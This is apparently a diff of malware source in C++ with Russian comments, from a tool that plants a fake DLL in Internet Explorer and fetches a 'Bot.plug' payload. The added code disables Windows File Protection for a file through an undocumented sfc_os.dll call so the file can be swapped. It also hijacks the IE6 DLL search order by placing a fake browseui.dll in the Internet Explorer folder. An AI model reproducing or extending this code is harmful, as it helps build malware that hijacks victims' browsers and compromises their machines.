@@ -242,6 +242,55 @@ wstring CreateRealDllName(const wstring& DllName)
 	return result;
 }
 
+
+// Ф-ция отключает слежение SFC за файлом на одну минуту.(http://bitsum.com/aboutwfp.asp/)
+// За это время надо заменить файл.
+bool SetSfcExceptionForOneMinute(const WCHAR* Path)
+{
+	FAKEDLLDBG("AddFilePathToSfcExceptionList", "Started with Path='%S'", Path);
+
+	// Проверяет на факт того, что файл защищается SFC
+	// Возвращает TRUE если защищается и FALSE если нет
+	typedef BOOL  (WINAPI * SfcIsFileProtectedFunction)(IN HANDLE _pRpcHandle,IN LPCWSTR ProtFileName);
+
+	// Недокументированный вызов. 
+	// Отключает SFC для указанного файла на 1 минуту (http://bitsum.com/aboutwfp.asp/)
+	// Способ вызова: SfcFileSetException(NULL, L"c:\\windows\\notepad.exe", -1);
+	// Если всё хорошо - возвращает 0
+	// Если не хорошо - возвращает не 0
+	typedef DWORD (WINAPI * SfcFileSetExceptionFunction)(IN HANDLE _pRpcHandle,IN LPCWSTR ProtFileName,DWORD Mode);
+
+	HMODULE SfcDllHandle = (HMODULE)pLoadLibraryA("sfc_os.dll");
+	FAKEDLLDBG("AddFilePathToSfcExceptionList", "SFC library=0x%X", SfcDllHandle);
+	
+	if (SfcDllHandle == NULL) return false;
+	
+	SfcIsFileProtectedFunction SfcIsFileProtected = 
+		(SfcIsFileProtectedFunction)pGetProcAddress(SfcDllHandle, "SfcIsFileProtected");
+
+	SfcFileSetExceptionFunction SfcFileSetException=
+		(SfcFileSetExceptionFunction)GetProcAddress(SfcDllHandle,(const char*)5);
+
+	FAKEDLLDBG("AddFilePathToSfcExceptionList", "SfcIsFileProtected=0x%X SfcFileSetException=0x%X", 
+		SfcIsFileProtected, SfcFileSetException);
+	
+	// Если не удалось подгрузить ф-ции - завершаем работы с ошибкой
+	if (SfcIsFileProtected == NULL) return false;
+	if (SfcFileSetException == NULL) return false;
+
+	// Если файл не защищается - просто завершаемся с положительным результатом
+	BOOL FileProtectedBySfc = SfcIsFileProtected(NULL, Path);
+	FAKEDLLDBG("AddFilePathToSfcExceptionList", "FileProtectedBySfc=%d", FileProtectedBySfc);
+
+	if (FileProtectedBySfc == FALSE) return true;
+
+	DWORD SfcFileSetExceptionResult = SfcFileSetException(NULL, Path, -1);
+	FAKEDLLDBG("AddFilePathToSfcExceptionList", "SfcFileSetExceptionResult=%u", 
+		SfcFileSetExceptionResult);
+
+	return (SfcFileSetExceptionResult == 0);
+}
+
 // В зависимости от версии IE :
 // 1) выбирает путь ДЛЛ, в которую будет сохранятся FakeDll
 // 2) выбирает путь ДЛЛ, куда будет перемещена оригинальная ДЛЛ
@@ -263,6 +312,11 @@ bool SelectTargetIeDll(
 	{
 		L"custsat.dll",
 		L"ieproxy.dll"
+	};
+
+	const WCHAR * Ie6Files[] = 
+	{
+		 L"browseui.dll"
 	};
 
 	WCHAR PathBuffer[2* MAX_PATH];
@@ -295,10 +349,26 @@ bool SelectTargetIeDll(
 
 	if (IeVersion == 6) 
 	{
-		DllDirectory = System32Path + wstring(L"\\macromed\\flash\\");
-		DllName = L"flash.ocx";
+		//DllDirectory = System32Path + wstring(L"\\macromed\\flash\\");
+		//DllName = L"flash.ocx";
+		
+		// Для IE 6 будем делать подмену системной DLLки путем создания с таким же именем 
+		// в папке IE. Поскольку порядок загрузки начинается с папки с программой,
+		// загрузка не по абсолютному пути начнется с нашей DLLки.
+
+		MoveFakeToRealBeforeFakeSave = false;
+
+		DllName = Ie6Files[RandNumber % ARRAYSIZE(Ie6Files)];;
+
+		FakeDllPath = ProgramFilesPath + wstring(L"\\Internet Explorer\\") + DllName;
+		RealDllPath = System32Path + wstring(L"\\") + DllName;
+		
+		return true;
 	}
 	
+	// Для IE7 и IE8 механизм одинаков
+	// Подмена делается 
+
 	if (IeVersion == 7) 
 	{
 		DllDirectory = ProgramFilesPath + wstring(L"\\Internet Explorer\\");
@@ -328,7 +398,7 @@ LPVOID GetBuiltinFakeDllBody(DWORD & Size)
 }
 
 // Качает тело Bot.plug с инета.
-// Выделена отдельно, потому что возвожно будем встраивать Bot.plug прямо в инсталер.
+// Выделена отдельно, потому что возможно будем встраивать Bot.plug прямо в инсталер.
 LPVOID LoadBotPlugBody(const string& BotPlugName, DWORD & Size)
 {
 	//return File::ReadToBufferA("bot.plug", Size);
@@ -404,7 +474,7 @@ void TryDisableAutoUpdateService()
 			
 			if (QueryResult == FALSE) break;
 			if (ssp.dwCurrentState == SERVICE_STOPPED) break;
-			if (((DWORD)pGetTickCount() - StartTime) > Timeout ) break;
+			if (((DWORD)pGetTickCount() - StartTime) > Timeout) break;
 		}
 	}
 	while(false);
